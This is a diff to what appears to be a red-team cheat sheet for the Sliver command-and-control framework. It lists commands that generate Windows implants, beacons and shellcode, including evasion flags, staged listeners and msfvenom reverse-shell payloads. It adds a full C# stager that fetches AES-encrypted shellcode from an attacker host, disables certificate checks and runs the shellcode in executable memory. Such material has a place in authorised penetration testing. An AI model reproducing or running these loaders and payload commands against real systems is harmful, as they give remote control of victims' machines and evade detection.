@@ -304,11 +304,13 @@ $ cat .env
 
 > https://github.com/BishopFox/sliver
 
-> https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2
+> https://sliver.sh/docs?name=Stagers
 
-> https://github.com/BishopFox/sliver/wiki/Beginner's-Guide
+> https://sliver.sh/docs?name=HTTPS+C2
 
-> https://github.com/BishopFox/sliver/wiki/Getting-Started
+> https://sliver.sh/docs?name=Getting+Started
+
+> https://sliver.sh/docs?name=Getting+Started
 
 ### Installation
 
@@ -409,44 +411,157 @@ username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
 
 ```
 sliver > help generate
-sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
-sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY
-sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY -G
-sliver > generate stager --lhost <LHOST> --os windows --arch amd64 --format c --save /PATH/TO/BINARY
-sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
-sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY
-sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY -G
+sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY/
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY/
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY/
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY/
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY/
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY/
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
+sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY/
+sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY/ -G
+sliver > generate stager --lhost <LHOST> --os windows --arch amd64 --format c --save /PATH/TO/BINARY/
+sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY/
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY/
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY/
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY/
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY/
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY/
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
+sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY/
+sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY/ -G
 sliver > generate beacon --http <LHOST>?proxy=http://<LHOST>:8080,<LHOST>?driver=wininet --os windows --arch amd64 --format shellcode --seconds 30 --jitter 3 --name <NAME> --save /tmp/<FILE>.bin -G --skip-symbols
 ```
 
-### Profile Handling
+### Profiles, Listener and Stagers
+
+> https://sliver.sh/docs
+
+#### Profiles
+
+```c
+sliver > profiles new --mtls <LHOST>:<LPORT> --arch amd64 --format shellcode --skip-symbols <PROFILE>
+sliver > profiles new beacon --mtls <LHOST>:<LPORT> --arch amd64 --format shellcode --skip-symbols <PROFILE>
+```
+
+#### Listener
+
+```c
+sliver > stage-listener --url tcp://<LHOST>:<LPORT> --profile <PROFILE>
+```
+
+##### Encrypted Listener
+
+```c
+sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
+```
+
+```c
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace Sliver_stager
+{
+    class Program
+    {
+        private static string AESKey = "D(G+KbPeShVmYq3t";
+        private static string AESIV = "8y/B?E(G+KbPeShV";
+        private static string url = "http://<LHOST>:<LPORT>/<NAME>.woff";
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        public static void DownloadAndExecute()
+        {
+            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+            System.Net.WebClient client = new System.Net.WebClient();
+            byte[] shellcode = client.DownloadData(url);
+
+            List<byte> l = new List<byte> { };
+
+            for (int i = 16; i <= shellcode.Length -1; i++) {
+                l.Add(shellcode[i]);
+            }
+
+            byte[] actual = l.ToArray();
+
+            byte[] decrypted;
+
+            decrypted = Decrypt(actual, AESKey, AESIV);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decrypted.Length, 0x3000, 0x40);
+            Marshal.Copy(decrypted, 0, addr, decrypted.Length);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            return;
+        }
+
+        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
+        {
+            byte[] key = Encoding.UTF8.GetBytes(AESKey);
+            byte[] IV = Encoding.UTF8.GetBytes(AESIV);
+
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = key;
+                aesAlg.IV = IV;
+                aesAlg.Padding = PaddingMode.None;
+
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
+                {
+                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
+                    {
+                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
+                        return memoryStream.ToArray();
+                    }
+                }
+            }
+        }
+
+        public static void Main(String[] args)
+        {
+            DownloadAndExecute();
+        }
+    }
+}
+
+```
+
+#### Stager
+
+```c
+sliver > generate stager --lhost <LHOST> --lport <LPORT> --arch amd64 --format c --save /PATH/TO/BINARY/
+```
+
+#### Examples
 
 ```c
 sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
 sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE>
-sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --save /PATH/TO/BINARY
+sliver > generate stager --lhost <LHOST> --lport <LPORT> --arch amd64 --format c --save /PATH/TO/BINARY/
 ```
 
 ```c
 sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
 sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --prepend-size
-sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --format c --save /PATH/TO/BINARY
+sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --format c --save /PATH/TO/BINARY/
 ```
 
 #### Error: rpc error: code = Unknown desc = exit status 1 - Please make sure Metasploit framework >= v6.2 is installed and msfvenom/msfconsole are in your PATH
@@ -454,7 +569,17 @@ sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --forma
 > https://github.com/BishopFox/sliver/issues/1580
 
 ```c
-$ msfvenom LHOST=<LHOST> LPORT=<LPORT> -p windows/x64/meterpreter/reverse_tcp -f c -o /tmp/stager.c
+$ msfvenom LHOST=<LHOST> LPORT=<LPORT> -p windows/x64/meterpreter/reverse_tcp -f c -o /PATH/TO/BINARY/stager.c
+```
+
+or
+
+```c
+$ msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<LHOST> LPORT=<LPORT> LURI=/<NAME>.woff -f raw -o /PATH/TO/BINARY/<FILE>.bin
+```
+
+```c
+sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --prepend-size
 ```
 
 ### Common Commands, Implant and Beacon Handling
@@ -490,7 +615,7 @@ sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // exe
 
 ```c
 sliver (NEARBY_LANGUAGE) > interactive
-sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY
+sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY/
 sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
 ```
 
